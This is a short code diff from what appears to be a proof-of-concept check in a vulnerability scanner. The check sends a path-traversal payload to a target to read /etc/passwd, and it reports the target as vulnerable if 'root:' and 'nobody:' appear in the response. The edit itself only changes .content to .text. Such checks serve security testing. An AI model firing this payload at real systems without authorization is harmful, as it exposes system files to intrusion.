@@ -50,7 +50,7 @@ class Poc(ABPoc):
             payload = '/../../../../../../../../../etc/passwd'
             verify_url = self.target + payload
 
-            content = requests.get(verify_url).content
+            content = requests.get(verify_url).text
             if 'root:' in content and 'nobody:' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
